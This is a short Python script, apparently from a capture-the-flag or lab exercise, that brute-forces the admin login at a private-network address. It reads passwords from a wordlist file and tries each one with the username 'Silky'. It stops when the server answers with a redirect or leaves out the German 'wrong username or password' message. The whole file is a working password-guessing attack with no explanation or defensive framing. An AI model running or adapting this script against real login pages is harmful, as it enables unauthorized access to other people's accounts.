#!/usr/bin/env python
from urllib import urlencode
import requests, sys

url = "http://192.168.1.105/admin.php"

f = open(sys.argv[1], 'r')
lines = f.readlines()
f.close()

n = 0
for line in lines:
	line = line.strip()
	params = (('username', 'Silky'), ('password', line))
	res = requests.get(url, params=urlencode(params))
	print(line, res.status_code, n, res.url)
	if res.status_code == 302 or 'Falscher Nutzernamen oder falsches Passwort' not in res.content:
		print line
		break

	n += 1